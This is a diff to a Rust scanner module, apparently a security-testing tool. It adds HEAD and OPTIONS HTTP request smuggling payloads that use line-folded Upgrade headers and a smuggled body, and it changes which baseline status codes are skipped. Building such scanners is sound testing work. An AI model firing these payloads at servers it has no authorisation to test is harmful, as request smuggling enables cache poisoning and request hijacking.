@@ -177,6 +177,7 @@ impl TrailSmugTask {
         //     {smug}
         // "));
 
+        // ------
         payloads.push(format!(
             "\
             HEAD {path} HTTP/1.1\r\n\
@@ -203,6 +204,8 @@ impl TrailSmugTask {
             {smug}"
         ));
 
+        // ----
+
         payloads.push(format!("\
             GET {path} HTTP/1.1\r\n\
             Host: {authority}\r\n\
@@ -226,6 +229,34 @@ impl TrailSmugTask {
             \r\n\
             {smug}
         "));
+
+        // ------
+
+        payloads.push(format!(
+            "\
+            HEAD {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            Content-Type: application/www-form-urlencoded\r\n\
+            Upgrade:\r\n\th2c,websocket\r\n\
+            \r\n\
+            {smug}"
+        ));
+
+        payloads.push(format!(
+            "\
+            OPTIONS {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            Content-Type: application/www-form-urlencoded\r\n\
+            Upgrade:\r\n\th2c,websocket\r\n\
+            \r\n\
+            {smug}"
+        ));
 
         Ok(payloads)
     }
@@ -261,7 +292,7 @@ impl Task for TrailSmugTask {
             }
         };
 
-        if [301, 302, 403, 404, 408, 429, 502, 503].contains(&baseline_res.status) {
+        if [301, 302, 400, 403, 404, 408, 429, 502, 503].contains(&baseline_res.status) {
             return Ok("".to_string());
         }
 
